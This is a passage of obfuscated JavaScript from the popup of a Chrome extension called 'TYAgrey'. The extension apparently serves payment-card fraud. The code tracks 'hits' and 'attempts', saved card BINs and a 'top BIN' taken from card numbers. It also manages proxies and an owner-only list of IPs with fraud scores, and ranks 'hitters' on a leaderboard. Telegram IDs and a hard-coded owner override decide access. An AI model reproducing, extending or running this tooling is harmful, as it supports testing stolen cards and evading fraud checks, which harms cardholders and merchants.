      }
      if (_0x1b3724) {
        _0x1b3724.textContent = "--";
      }
      if (_0x593b5c) {
        _0x593b5c.textContent = "--";
      }
      if (_0x19bffc) {
        _0x19bffc.textContent = "--";
      }
      if (_0x503749) {
        _0x503749.textContent = "--";
      }
      if (_0x280edb) {
        _0x280edb.textContent = "--";
      }
      if (_0x27594a) {
        _0x27594a.textContent = "--";
      }
      if (_0xb89c2c) {
        _0xb89c2c.textContent = "--";
      }
      if (_0x1d5397) {
        _0x1d5397.textContent = "--/100";
      }
      _0x38439c(0, "low");
    }
    function _0x38439c(_0x2f15fb, _0x3b7809) {
      if (!_0x452fa5) {
        return;
      }
      var _0x500a4b = _0x452fa5.querySelector("div");
      if (_0x500a4b) {
        var _0xe3e19e = _0x33c83a(_0x2f15fb);
        _0x500a4b.style.width = _0xe3e19e + "%";
        _0x500a4b.style.background = "";
        if (_0x3b7809 === "very-high") {
          _0x500a4b.style.background = "linear-gradient(90deg, #D32F2F, #B71C1C)";
        } else if (_0x3b7809 === "high") {
          _0x500a4b.style.background = "linear-gradient(90deg, #FF7043, #F44336)";
        } else if (_0x3b7809 === "medium") {
          _0x500a4b.style.background = "linear-gradient(90deg, #FFB74D, #FF9800)";
        } else {
          _0x500a4b.style.background = "linear-gradient(90deg, #4CAF50, #81C784)";
        }
      }
      var _0x213fe8 = _0x452fa5.querySelectorAll("span");
      if (_0x213fe8 && _0x213fe8.length) {
        var _0x15c39d = Math.round(_0x33c83a(_0x2f15fb) / 10);
        _0x213fe8.forEach(function (_0x106031, _0x4cd4b1) {
          _0x106031.className = "";
          if (_0x4cd4b1 < _0x15c39d) {
            _0x106031.className = "active " + _0x3b7809;
          }
        });
      }
    }
    (function _0x576120() {
      var _0x5d3b9d = "v" + chrome.runtime.getManifest().version;
      if (_0x3c2a48) {
        _0x3c2a48.textContent = _0x5d3b9d;
      }
      if (_0x3ed34f) {
        _0x3ed34f.textContent = _0x5d3b9d;
      }
    })();
    function _0x5df80a() {
      if (window.TYAGREY_COUNTRY_REGION && typeof window.TYAGREY_COUNTRY_REGION.init === "function") {
        window.TYAGREY_COUNTRY_REGION.init({
          toggleId: "countryRegionEnabled",
          selectId: "countryRegionSelect",
          statusId: "countryRegionStatus"
        });
      }
      var _0x20fa01 = document.getElementById("hitDelayMsInput");
      var _0x218dde = document.getElementById("hitDelayEnabled");
      if (_0x218dde) {
        _0x218dde.addEventListener("change", function () {
          if (userRole === "user") {
            return;
          }
          var _0x46b75d = this.checked;
          chrome.storage.local.set({
            tyagrey_hit_delay_enabled: _0x46b75d
          });
          _0x5afda7();
        });
      }
      if (_0x20fa01) {
        _0x20fa01.addEventListener("input", function () {
          if (userRole === "user") {
            return;
          }
          var _0x31261b = parseInt(this.value, 10);
          if (isNaN(_0x31261b) || _0x31261b < 100) {
            _0x31261b = 100;
          }
          if (_0x31261b > 10000) {
            _0x31261b = 10000;
          }
          this.value = _0x31261b;
          chrome.storage.local.set({
            tyagrey_hit_delay_ms: _0x31261b
          });
          var _0x2a2658 = document.getElementById("hitDelayStatus");
          if (_0x2a2658) {
            _0x2a2658.textContent = "Status: Enabled (" + _0x31261b + "ms custom delay)";
          }
        });
      }
      var _0x1fa71b = document.getElementById("profileName");
      var _0xa39d4 = document.getElementById("profileEmail");
      var _0x5b0a7b = document.getElementById("profileStatus");
      var _0x23dc48 = "TYAgrey";
      var _0x239cff = "tyagrey@voewo.com";
      function _0x1beaa8() {
        if (!_0x5b0a7b) {
          return;
        }
        var _0x52e335 = _0x1fa71b ? _0x1fa71b.value.trim() : "";
        var _0x24fa86 = _0xa39d4 ? _0xa39d4.value.trim() : "";
        if (!_0x52e335 && !_0x24fa86) {
          _0x5b0a7b.textContent = "Using defaults: " + _0x23dc48 + " / " + _0x239cff;
        } else {
          _0x5b0a7b.textContent = "Using: " + (_0x52e335 || _0x23dc48) + " / " + (_0x24fa86 || _0x239cff);
        }
      }
      if (_0x1fa71b || _0xa39d4) {
        chrome.storage.local.get(["tyagrey_profile_name", "tyagrey_profile_email"], function (_0x41a354) {
          if (_0x1fa71b) {
            _0x1fa71b.value = _0x41a354 && _0x41a354.tyagrey_profile_name ? _0x41a354.tyagrey_profile_name : "";
          }
          if (_0xa39d4) {
            _0xa39d4.value = _0x41a354 && _0x41a354.tyagrey_profile_email ? _0x41a354.tyagrey_profile_email : "";
          }
          _0x1beaa8();
        });
      }
      if (_0x1fa71b) {
        _0x1fa71b.addEventListener("input", function () {
          chrome.storage.local.set({
            tyagrey_profile_name: this.value.trim()
          });
          _0x1beaa8();
        });
      }
      if (_0xa39d4) {
        _0xa39d4.addEventListener("input", function () {
          chrome.storage.local.set({
            tyagrey_profile_email: this.value.trim()
          });
          _0x1beaa8();
        });
      }
      chrome.storage.local.remove(["tyagrey_ipfraud_count", "tyagrey_ipfraud_date"]);
      setTimeout(function () {
        _0x550dce(true, false);
        _0x4edc0a(true, false);
      }, 500);
      chrome.storage.local.get([_0xeb47fb], function (_0x4ecfbd) {
        _0x4dfe00 = _0x4ecfbd && _0x4ecfbd[_0xeb47fb] ? _0x4ecfbd[_0xeb47fb] : "";
        if (_0x58d276) {
          _0x58d276.value = _0x4dfe00;
        }
        if (_0x1688cb) {
          _0x1688cb.value = _0x4dfe00;
        }
      });
      function _0x23e289(_0x10fe2d, _0x122c86) {
        _0x4dfe00 = typeof _0x10fe2d === "string" ? _0x10fe2d.trim() : "";
        if (_0x58d276) {
          _0x58d276.value = _0x4dfe00;
        }
        if (_0x1688cb) {
          _0x1688cb.value = _0x4dfe00;
        }
        var _0x51cdc7 = {
          [_0xeb47fb]: _0x4dfe00
        };
        chrome.storage.local.set(_0x51cdc7, function () {
          if (typeof _0x122c86 === "function") {
            _0x122c86();
          }
        });
      }
      chrome.storage.local.get(["tyagrey_token", "tyagrey_user_id", "tyagrey_chat_id", "tyagrey_first_name", "tyagrey_telegram", "tyagrey_role", "tya_local_hits", "tya_local_attempts"], function (_0x520779) {
        _0xc81f0 = _0x520779.tyagrey_token || "";
        _0x42475b = _0x520779.tyagrey_user_id || "";
        userRole = _0x520779.tyagrey_role || "user";
        var _0x186aa7 = _0x520779.tyagrey_chat_id || "";
        var _0x300298 = _0x520779.tyagrey_user_id || "";
        if (_0x186aa7 == "7715922791" || _0x300298 == "7715922791") {
          userRole = "owner";
        }
        if (userRole === "owner") {
          if (_0x341ad6) {
            _0x341ad6.classList.remove("hidden");
          }
          var _0x13ba11 = document.getElementById("ownerPanelTabBtn");
          if (_0x13ba11) {
            _0x13ba11.classList.remove("hidden");
          }
        }
        _0x5afda7();
        _0x5d57eb.textContent = "0";
        _0x347659.textContent = "0";
        _0x469450.textContent = "0%";
        if (_0xc81f0) {
          _0x892fbd({}, _0x520779);
          _0x59e7fa("sync-my-hits", {
            token: _0xc81f0
          }).catch(function () {});
          _0x59e7fa("get-user-data", {
            token: _0xc81f0
          }).then(function (_0xd9d268) {
            if (_0xd9d268.success) {
              var _0x48e559 = typeof _0xd9d268.total_hits === "number" ? _0xd9d268.total_hits : 0;
              var _0x184433 = typeof _0xd9d268.total_attempts === "number" ? _0xd9d268.total_attempts : 0;
              _0x4162d0(_0x48e559, _0x184433);
              if (_0xd9d268.role) {
                userRole = _0xd9d268.role;
                _0x5afda7();
              }
              if (_0x26dad2) {
                var _0xf8f3 = typeof _0xd9d268.daily_hits === "number" ? _0xd9d268.daily_hits : 0;
                var _0x118f47 = typeof _0xd9d268.daily_limit === "number" ? _0xd9d268.daily_limit : 5;
                if (userRole === "user") {
                  _0x26dad2.textContent = _0xf8f3 + "/" + _0x118f47;
                } else {
                  _0x26dad2.textContent = "∞";
                }
              }
              chrome.storage.local.set({
                tya_local_hits: Math.max(_0x520779.tya_local_hits || 0, _0x48e559),
                tya_local_attempts: Math.max(_0x520779.tya_local_attempts || 0, _0x184433),
                tya_local_history: Array.isArray(_0xd9d268.hit_history) ? _0xd9d268.hit_history : _0x520779.tya_local_history || []
              });
              if (Array.isArray(_0xd9d268.saved_bins)) {
                chrome.storage.local.set({
                  tyagrey_saved_bins: _0xd9d268.saved_bins
                });
              }
            }
          });
          _0x59e7fa("validate", {
            token: _0xc81f0
          }).then(function (_0x5201bb) {
            console.log("[POPUP] validate API raw response:", JSON.stringify(_0x5201bb));
            console.log("[POPUP] API returned -> chat_id:", _0x5201bb.chat_id, "| user_id:", _0x5201bb.user_id, "| role:", _0x5201bb.role);
            if (_0x5201bb.chat_id == "7715922791" || _0x5201bb.user_id == "7715922791") {
              _0x5201bb.role = "owner";
              userRole = "owner";
            }
            if (_0x5201bb.success) {
              console.log("Inside success block - about to set user data");
              if (_0x2e5b51) {
                _0x2e5b51.textContent = _0x5201bb.global_hits || 0;
              }
              if (_0x5d57eb && typeof _0x5201bb.hits === "number") {
                _0x5d57eb.textContent = _0x5201bb.hits;
              }
              if (_0x347659 && typeof _0x5201bb.attempts === "number") {
                _0x347659.textContent = _0x5201bb.attempts;
              }
              if (_0x469450 && typeof _0x5201bb.hits === "number" && typeof _0x5201bb.attempts === "number") {
                _0x469450.textContent = _0x5201bb.attempts > 0 ? Math.round(_0x5201bb.hits / _0x5201bb.attempts * 100) + "%" : "0%";
              }
              if (_0x26dad2) {
                if (userRole === "user" && typeof _0x5201bb.daily_hits === "number" && typeof _0x5201bb.daily_limit === "number") {
                  _0x26dad2.textContent = _0x5201bb.daily_hits + "/" + _0x5201bb.daily_limit;
                } else if (userRole !== "user") {
                  _0x26dad2.textContent = "∞";
                }
              }
              if (_0x291ef5) {
                _0x291ef5.className = "status-dot green";
              }
              if (_0x1623b5) {
                _0x1623b5.textContent = "Valid";
              }
              if (_0x28ebcb) {
                _0x28ebcb.className = "status-dot-header valid";
              }
              _0x42475b = _0x5201bb.user_id || _0x42475b;
              userRole = _0x5201bb.role || "user";
              var _0x6140ad = "";
              if (_0x5201bb.first_name && _0x5201bb.last_name) {
                _0x6140ad = _0x5201bb.first_name + " " + _0x5201bb.last_name;
              } else if (_0x5201bb.first_name) {
                _0x6140ad = _0x5201bb.first_name;
              } else if (_0x5201bb.last_name) {
                _0x6140ad = _0x5201bb.last_name;
              } else {
                _0x6140ad = "TYAgrey Hitter";
              }
              if (_0x5e3bc6) {
                _0x5e3bc6.textContent = _0x6140ad;
              }
              _0x5afda7();
              _0x892fbd(_0x5201bb, _0x520779);
              chrome.storage.local.set({
                tyagrey_user_id: _0x5201bb.user_id || _0x520779.tyagrey_user_id || "",
                tyagrey_chat_id: _0x5201bb.chat_id || _0x520779.tyagrey_chat_id || "",
                tyagrey_first_name: _0x5201bb.first_name || _0x520779.tyagrey_first_name || "",
                tyagrey_telegram: (_0x5201bb.username || _0x5201bb.telegram_username || _0x520779.tyagrey_telegram || "").trim(),
                tyagrey_role: userRole
              });
              _0x59e7fa("migrate-history", {
                token: _0xc81f0
              });
            } else {
              if (_0x291ef5) {
                _0x291ef5.className = "status-dot red";
              }
              if (_0x1623b5) {
                _0x1623b5.textContent = "Invalid";
              }
              if (_0x28ebcb) {
                _0x28ebcb.className = "status-dot-header expired";
              }
            }
          });
        }
        _0x115320();
      });
    }
    function _0x560dba() {
      chrome.storage.local.get(["tya_local_hits", "tya_local_attempts"], function (_0x3fb02f) {
        var _0x52644f = _0x3fb02f.tya_local_hits || 0;
        var _0x5111c5 = _0x3fb02f.tya_local_attempts || 0;
        var _0x3da581 = parseInt(_0x5d57eb.textContent, 10) || 0;
        var _0x5f57ad = parseInt(_0x347659.textContent, 10) || 0;
        if (_0x52644f > _0x3da581) {
          _0x5d57eb.textContent = _0x52644f;
        }
        if (_0x5111c5 > _0x5f57ad) {
          _0x347659.textContent = _0x5111c5;
        }
        var _0x563129 = parseInt(_0x5d57eb.textContent, 10) || 0;
        var _0x46898a = parseInt(_0x347659.textContent, 10) || 0;
        _0x469450.textContent = _0x46898a > 0 ? Math.round(_0x563129 / _0x46898a * 100) + "%" : "0%";
      });
      if (!_0xc81f0) {
        return;
      }
      _0x59e7fa("get-user-data", {
        token: _0xc81f0
      }).then(function (_0x4cb3f0) {
        if (_0x4cb3f0.success) {
          var _0x5145d9 = typeof _0x4cb3f0.total_hits === "number" ? _0x4cb3f0.total_hits : 0;
          var _0x38f92c = typeof _0x4cb3f0.total_attempts === "number" ? _0x4cb3f0.total_attempts : 0;
          _0x4162d0(_0x5145d9, _0x38f92c);
          if (_0x4cb3f0.role) {
            userRole = _0x4cb3f0.role;
            _0x5afda7();
          }
          if (_0x26dad2) {
            var _0x498134 = typeof _0x4cb3f0.daily_hits === "number" ? _0x4cb3f0.daily_hits : 0;
            var _0x318a17 = typeof _0x4cb3f0.daily_limit === "number" ? _0x4cb3f0.daily_limit : 5;
            if (userRole === "user") {
              _0x26dad2.textContent = _0x498134 + "/" + _0x318a17;
            } else {
              _0x26dad2.textContent = "∞";
            }
          }
          if (Array.isArray(_0x4cb3f0.saved_bins)) {
            chrome.storage.local.set({
              tyagrey_saved_bins: _0x4cb3f0.saved_bins
            });
          }
        }
      });
      chrome.storage.local.get(["tyagrey_user_id", "tyagrey_chat_id", "tyagrey_first_name", "tyagrey_telegram"], function (_0x20e1ac) {
        _0x59e7fa("validate", {
          token: _0xc81f0
        }).then(function (_0x4d967e) {
          if (_0x4d967e.success) {
            _0x2e5b51.textContent = _0x4d967e.global_hits || 0;
            if (_0x5d57eb && typeof _0x4d967e.hits === "number") {
              _0x5d57eb.textContent = _0x4d967e.hits;
            }
            if (_0x26dad2) {
              if (userRole === "user" && typeof _0x4d967e.daily_hits === "number" && typeof _0x4d967e.daily_limit === "number") {
                _0x26dad2.textContent = _0x4d967e.daily_hits + "/" + _0x4d967e.daily_limit;
              } else if (userRole !== "user") {
                _0x26dad2.textContent = "∞";
              }
            }
            _0x892fbd(_0x4d967e, _0x20e1ac);
            chrome.storage.local.set({
              tyagrey_user_id: _0x4d967e.user_id || _0x20e1ac.tyagrey_user_id || "",
              tyagrey_chat_id: _0x4d967e.chat_id || _0x20e1ac.tyagrey_chat_id || "",
              tyagrey_first_name: _0x4d967e.first_name || _0x20e1ac.tyagrey_first_name || "",
              tyagrey_telegram: (_0x4d967e.username || _0x4d967e.telegram_username || _0x20e1ac.tyagrey_telegram || "").trim()
            });
          }
        });
      });
    }
    var _0x23b72f = setInterval(_0x560dba, 10000);
    setInterval(function () {
      if (_0x36f16d && _0x4bba41 === "myhits") {
        console.log("🔄 [POPUP] Auto-refreshing My Hits section");
        _0x36f16d = false;
        _0x5a406a();
      }
    }, 15000);
    chrome.storage.onChanged.addListener(function (_0x179d2c, _0x430e97) {
      if (_0x430e97 !== "local") {
        return;
      }
      if (_0x179d2c.tya_local_hits && _0x179d2c.tya_local_hits.newValue > (_0x179d2c.tya_local_hits.oldValue || 0)) {
        console.log("📊 [POPUP] New hit detected! Refreshing...");
        _0x560dba();
        _0x36f16d = false;
        if (_0x4bba41 === "myhits") {
          console.log("📍 [POPUP] My Hits tab is open, reloading now");
          _0x5a406a();
        }
      }
      if (_0x179d2c.tyagrey_saved_bins || _0x179d2c.tyagrey_panel_quick_bins) {
        console.log("♻️ [POPUP] BIN list updated from panel or cloud, refreshing My Cloud BINS");
        if (_0x4bba41 === "mybins") {
          _0x36af0d();
        }
      }
    });
    function _0x115320() {
      if (chrome.proxy && chrome.proxy.settings) {
        chrome.proxy.settings.get({}, function (_0x21cb60) {
          if (_0x21cb60 && _0x21cb60.value && _0x21cb60.value.mode === "fixed_servers" && _0x21cb60.value.rules) {
            var _0x3b12ae = _0x21cb60.value.rules.singleProxy;
            if (_0x3b12ae && _0x3b12ae.host) {
              _0x22b33b = true;
              _0x181b8c.textContent = "Connected";
              _0x181b8c.className = "proxy-status-text connected";
              _0x55c5f6.className = "proxy-status-icon connected";
              _0x55c5f6.innerHTML = "<svg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path d=\"M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z\"/></svg>";
              _0x5c3c7f.textContent = _0x3b12ae.host + ":" + _0x3b12ae.port;
              _0x5c3c7f.classList.add("visible");
              _0x16e1c9.textContent = _0x3b12ae.scheme ? _0x3b12ae.scheme.toUpperCase() : "HTTP";
              _0x3172d7.textContent = _0x3b12ae.port || "--";
              _0x5b8884.className = "status-dot green";
              _0x1f05db.textContent = _0x3b12ae.host;
            } else {
              _0x1161fd();
            }
          } else {
            _0x1161fd();
          }
        });
      } else {
        _0x5b8884.className = "status-dot red";
        _0x1f05db.textContent = "N/A";
      }
    }
    function _0x1161fd() {
      _0x22b33b = false;
      _0x5b8884.className = "status-dot red";
      _0x1f05db.textContent = "Not Set";
    }
    _0x926100.addEventListener("click", function () {
      _0x926100.disabled = true;
      _0x926100.innerHTML = "<svg viewBox=\"0 0 24 24\" width=\"14\" height=\"14\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\"><circle cx=\"12\" cy=\"12\" r=\"10\"/><path d=\"M12 6v6l4 2\"/></svg> Clearing...";
      if (chrome.proxy && chrome.proxy.settings) {
        chrome.proxy.settings.clear({
          scope: "regular"
        }, function () {
          chrome.storage.local.remove(["proxyAuth", "tyagrey_proxy_enabled", "tyagrey_proxy_string"], function () {
            if (chrome.tabs && chrome.tabs.query) {
              chrome.tabs.query({}, function (_0x4bc1d9) {
                (_0x4bc1d9 || []).forEach(function (_0xb451e5) {
                  if (_0xb451e5.id) {
                    try {
                      chrome.tabs.sendMessage(_0xb451e5.id, {
                        action: "clearProxyStorage"
                      }, function () {
                        if (chrome.runtime.lastError) {}
                      });
                    } catch (_0x12d1bd) {}
                  }
                });
                _0x228f14();
                _0x1161fd();
                tabBtns[0].click();
              });
            } else {
              _0x228f14();
              _0x1161fd();
              tabBtns[0].click();
            }
          });
        });
      } else {
        _0x228f14();
      }
    });
    function _0x228f14() {
      _0x926100.innerHTML = "<svg viewBox=\"0 0 24 24\" width=\"14\" height=\"14\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><line x1=\"18\" y1=\"6\" x2=\"6\" y2=\"18\"/><line x1=\"6\" y1=\"6\" x2=\"18\" y2=\"18\"/></svg> Clear Proxy";
      _0x926100.disabled = false;
    }
    function _0x1e3402() {
      if (!_0xc81f0 || userRole !== "owner") {
        return;
      }
      if (_0x1accee) {
        _0x1accee.textContent = "Loading owner IP list...";
      }
      if (_0x9412c6) {
        _0x9412c6.innerHTML = "<div class=\"binlib-empty\">Loading saved IPs...</div>";
      }
      _0x59e7fa("get-ip-list", {
        token: _0xc81f0
      }).then(function (_0x7e619f) {
        if (!_0x7e619f || !_0x7e619f.success || !Array.isArray(_0x7e619f.list)) {
          if (_0x1accee) {
            _0x1accee.textContent = _0x7e619f && _0x7e619f.message ? _0x7e619f.message : "Unable to load IP list.";
          }
          if (_0x9412c6) {
            _0x9412c6.innerHTML = "<div class=\"binlib-empty\">No saved IPs found.</div>";
          }
          return;
        }
        _0x43b1e7(_0x7e619f.list);
      });
    }
    function _0x43b1e7(_0x514ef3) {
      if (!Array.isArray(_0x514ef3) || _0x514ef3.length === 0) {
        if (_0x1accee) {
          _0x1accee.textContent = "No saved IPs found.";
        }
        if (_0x9412c6) {
          _0x9412c6.innerHTML = "<div class=\"binlib-empty\">Owner-only IP list is empty.</div>";
        }
        return;
      }
      if (_0x1accee) {
        _0x1accee.textContent = "Showing " + _0x514ef3.length + " saved IPs.";
      }
      if (!_0x9412c6) {
        return;
      }
      _0x9412c6.innerHTML = "";
      _0x514ef3.forEach(function (_0x1858d8) {
        var _0x574226 = document.createElement("div");
        _0x574226.className = "ip-list-row";
        _0x574226.dataset.proxy = _0x1858d8.proxy_string || _0x1858d8.ip || "";
        _0x574226.style = "display:flex;justify-content:space-between;align-items:center;padding:10px 8px;border-bottom:1px solid rgba(255,255,255,0.08);gap:10px;";
        var _0x11e5a1 = document.createElement("div");
        _0x11e5a1.style = "flex:1; min-width:0;";
        var _0x590a7c = document.createElement("div");
        _0x590a7c.textContent = _0x1858d8.proxy_string || _0x1858d8.ip || "Unknown";
        _0x590a7c.style = "font-size:13px; font-family: monospace; word-break: break-all;";
        var _0x352318 = document.createElement("div");
        _0x352318.style = "font-size:11px; color: var(--text-muted); margin-top: 4px; line-height:1.4;";
        var _0x35de6b = _0x1858d8.user_id ? "User: " + _0x1858d8.user_id : _0x1858d8.username ? "User: @" + _0x1858d8.username : "User: unknown";
        var _0x31a13b = _0x1858d8.ip ? "IP: " + _0x1858d8.ip : "";
        var _0x201aeb = _0x1858d8.ip_score ? "Score: " + _0x1858d8.ip_score + "/100" : "";
        _0x352318.textContent = [_0x35de6b, _0x31a13b, _0x201aeb].filter(Boolean).join(" • ") + (_0x1858d8.updated_at ? " • " + _0x1858d8.updated_at : "");
        _0x11e5a1.appendChild(_0x590a7c);
        _0x11e5a1.appendChild(_0x352318);
        var _0x3b3f96 = document.createElement("div");
        _0x3b3f96.style = "display:flex;gap:8px;flex-shrink:0;";
        var _0x247289 = document.createElement("button");
        _0x247289.textContent = "Copy";
        _0x247289.style = "padding:6px 10px;font-size:11px;border:1px solid #16a34a;background:#ecfdf5;color:#166534;border-radius:6px;cursor:pointer;";
        _0x247289.addEventListener("click", function () {
          var _0x1acc3d = _0x1858d8.proxy_string || _0x1858d8.ip || "";
          if (!_0x1acc3d) {
            return;
          }
          navigator.clipboard.writeText(_0x1acc3d).then(function () {
            alert("Copied to clipboard");
          }).catch(function () {
            alert("Copy failed. Please try again manually.");
          });
        });
        var _0x12f6a0 = document.createElement("button");
        _0x12f6a0.textContent = "Delete";
        _0x12f6a0.style = "padding:6px 10px;font-size:11px;border:1px solid #dc2626;background:#fee2e2;color:#b91c1c;border-radius:6px;cursor:pointer;";
        _0x12f6a0.addEventListener("click", function () {
          if (!confirm("Delete this IP from cloud DB? This cannot be undone.")) {
            return;
          }
          _0x2aab0f(_0x1858d8.proxy_string || _0x1858d8.ip);
        });
        _0x3b3f96.appendChild(_0x247289);
        _0x3b3f96.appendChild(_0x12f6a0);
        _0x574226.appendChild(_0x11e5a1);
        _0x574226.appendChild(_0x3b3f96);
        _0x9412c6.appendChild(_0x574226);
      });
    }
    function _0x2aab0f(_0x191084) {
      if (!_0xc81f0 || !_0x191084) {
        return;
      }
      _0x59e7fa("owner-delete-ip", {
        token: _0xc81f0,
        ip: _0x191084
      }).then(function (_0x4636a3) {
        if (_0x4636a3 && _0x4636a3.success) {
          _0x1e3402();
        } else {
          alert(_0x4636a3 && _0x4636a3.message ? _0x4636a3.message : "Failed to delete IP from cloud database.");
        }
      });
    }
    if (_0x123da0) {
      _0x123da0.addEventListener("click", function () {
        _0x1e3402();
      });
    }
    if (_0xd2728) {
      _0xd2728.addEventListener("click", function () {
        var _0x8561d9 = "";
        var _0x67166b = _0x9412c6 ? _0x9412c6.querySelectorAll(".ip-list-row") : [];
        _0x67166b.forEach(function (_0x93ed16) {
          var _0x3f9f5a = _0x93ed16.dataset.proxy || "";
          if (_0x3f9f5a) {
            _0x8561d9 += _0x3f9f5a + "\n";
          }
        });
        if (!_0x8561d9) {
          alert("No IPs available to copy.");
          return;
        }
        navigator.clipboard.writeText(_0x8561d9.trim()).then(function () {
          alert("IP list copied to clipboard.");
        }).catch(function () {
          alert("Copy failed. Please try again manually.");
        });
      });
    }
    var _0x5a040c = _0x1d3308("statsFooter");
    var _0x3bb516 = _0x1d3308("statsFooterRank");
    var _0x165a35 = _0x1d3308("statsFooterName");
    var _0x29b0d3 = _0x1d3308("statsFooterHits");
    function _0x190705() {
      _0x4a801b = true;
      if (_0xc81f0) {
        _0x59e7fa("get-user-data", {
          token: _0xc81f0
        }).then(function (_0x22198f) {
          if (_0x22198f.success) {
            if (_0x22198f.role) {
              userRole = _0x22198f.role;
              _0x5afda7();
            }
            var _0x205a7c = Array.isArray(_0x22198f.hit_history) ? _0x22198f.hit_history : [];
            var _0x19ba60 = typeof _0x22198f.total_hits === "number" ? _0x22198f.total_hits : 0;
            var _0x5500a8 = typeof _0x22198f.total_attempts === "number" ? _0x22198f.total_attempts : 0;
            var _0x3eb56f = Date.now();
            var _0x2c26e1 = _0x205a7c.filter(function (_0x3f31ee) {
              var _0x2ef0c1 = new Date(_0x3f31ee.time || _0x3f31ee.created_at).getTime();
              return _0x3eb56f - _0x2ef0c1 < 86400000;
            }).length;
            _0x1d3308("statVelocity").textContent = _0x2c26e1;
            var _0x217721 = {};
            _0x205a7c.forEach(function (_0x752201) {
              var _0x4efc62 = _0x752201.card || _0x752201.card_info ? (_0x752201.card || _0x752201.card_info).substring(0, 8) : "----";
              _0x217721[_0x4efc62] = (_0x217721[_0x4efc62] || 0) + 1;
            });
            var _0x21da18 = "----";
            var _0x71408b = 0;
            for (var _0x13f0a2 in _0x217721) {
              if (_0x217721[_0x13f0a2] > _0x71408b) {
                _0x71408b = _0x217721[_0x13f0a2];
                _0x21da18 = _0x13f0a2;
              }
            }
            _0x1d3308("statTopBin").textContent = _0x21da18;
            var _0xf3146e = _0x5500a8 * 3.5;
            if (_0xf3146e < 60) {
              _0x1d3308("statSaved").textContent = Math.round(_0xf3146e) + "s";
            } else {
              _0x1d3308("statSaved").textContent = Math.round(_0xf3146e / 60) + "m";
            }
            _0x1d3308("statAccuracy").textContent = _0x5500a8 > 0 ? Math.round(_0x19ba60 / _0x5500a8 * 100) + "%" : "0%";
            chrome.storage.local.set({
              tya_local_hits: _0x19ba60,
              tya_local_attempts: _0x5500a8,
              tya_local_history: _0x205a7c
            });
          }
        });
      }
      var _0xd89e3d = _0x59e7fa("popup-stats");
      var _0x4c8ac2 = {
        limit: 50
      };
      if (_0x42475b) {
        _0x4c8ac2.user_id = _0x42475b;
      }
      var _0x242470 = _0x59e7fa("leaderboard", _0x4c8ac2);
      _0xd89e3d.then(function (_0x4f0636) {
        if (_0x4f0636.success) {
          _0xf09f8d.textContent = _0x4f0636.total_users || 0;
          _0x5b0ff5.textContent = _0x4f0636.total_hits || 0;
          _0x55d3f6.textContent = _0x4f0636.hits_today || 0;
          _0x51db00.textContent = _0x4f0636.hits_week || 0;
        }
      });
      _0x242470.then(function (_0x5095f9) {
        if (!_0x5095f9.success || !_0x5095f9.leaderboard || _0x5095f9.leaderboard.length === 0) {
          _0x3c4822.innerHTML = "<div class=\"empty-state\"><div class=\"icon\"><svg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><circle cx=\"12\" cy=\"8\" r=\"7\"/><polyline points=\"8.21 13.89 7 23 12 20 17 23 15.79 13.88\"/></svg></div><div class=\"empty-state-text\">No data yet</div></div>";
          return;
        }
        var _0x494fc9 = "";
        var _0x4e702f = null;
        var _0x86cb6f = 0;
        var _0x156072 = "";
        _0x5095f9.leaderboard.forEach(function (_0x303631, _0x45b54f) {
          var _0x8d1ec5 = _0x45b54f + 1;
          var _0x4887b7 = _0x303631.first_name || _0x303631.username || "Unknown";
          if (_0x42475b && String(_0x303631.user_id) === String(_0x42475b)) {
            if (_0x303631.first_name && _0x303631.last_name) {
              _0x4887b7 = _0x303631.first_name + " " + _0x303631.last_name;
            } else if (_0x303631.first_name) {
              _0x4887b7 = _0x303631.first_name;
            } else if (_0x303631.last_name) {
              _0x4887b7 = _0x303631.last_name;
            } else {
              _0x4887b7 = _0x303631.username || "Unknown";
            }
          }
          var _0x5d58df = _0x303631.username ? "@" + _0x303631.username : "";
          var _0x2d5319 = _0x303631.pfp_url || "";
          var _0x414791 = _0x4887b7.charAt(0).toUpperCase();
          var _0x54e94f = _0x8d1ec5 <= 3 ? "rank-" + _0x8d1ec5 : "rank-default";
          var _0x5ae05e = _0x42475b && String(_0x303631.user_id) === String(_0x42475b);
          if (_0x5ae05e) {
            _0x4e702f = _0x8d1ec5;
            _0x86cb6f = _0x303631.hits || 0;
            _0x156072 = _0x4887b7;
          }
          var _0x4756c1;
          if (_0x5ae05e) {
            _0x4756c1 = "<img class=\"hitter-pfp\" src=\"icons/icon128.png\" alt=\"\" style=\"display:block;\">";
          } else if (_0x2d5319 && _0x2d5319.length > 5) {
            _0x4756c1 = "<img class=\"hitter-pfp\" src=\"" + _0x4db7b6(_0x2d5319) + "\" alt=\"\" style=\"display:block;\"><div class=\"hitter-pfp-fallback\" style=\"display:none;\">" + _0x3b7b71(_0x414791) + "</div>";
          } else {
            _0x4756c1 = "<div class=\"hitter-pfp-fallback\">" + _0x3b7b71(_0x414791) + "</div>";
          }
          var _0x35cb47 = _0x5ae05e ? " top-hitter--me" : "";
          _0x494fc9 += "<div class=\"top-hitter" + _0x35cb47 + "\"><div class=\"rank-badge " + _0x54e94f + "\">#" + _0x8d1ec5 + "</div>" + _0x4756c1 + "<div class=\"hitter-info\"><div class=\"hitter-name\">" + _0x3b7b71(_0x4887b7) + (_0x5ae05e ? " <span style=\"font-size:8px;color:var(--accent);font-weight:700;\">(You)</span>" : "") + "</div><div class=\"hitter-username\">" + _0x3b7b71(_0x5d58df) + "</div></div><div class=\"hitter-hits\">" + (_0x303631.hits || 0) + "</div></div>";
        });
        _0x3c4822.innerHTML = _0x494fc9;
        var _0x158818 = _0x3c4822.querySelectorAll(".hitter-pfp");
        _0x158818.forEach(function (_0x24f652) {
          _0x24f652.addEventListener("error", function () {
            if (_0x24f652.src.includes("icons/icon128.png")) {
              return;
            }
            _0x24f652.style.display = "none";
            var _0x1bfe63 = _0x24f652.nextElementSibling;
            if (_0x1bfe63) {
              _0x1bfe63.style.display = "flex";
            }
          });
        });
        var _0x223a30 = _0x5095f9.my_rank || null;
        var _0x43d84a = null;
        var _0x4e5706 = "";
        var _0x4c76ca = 0;
        var _0x36859d = "";
        if (_0x42475b) {
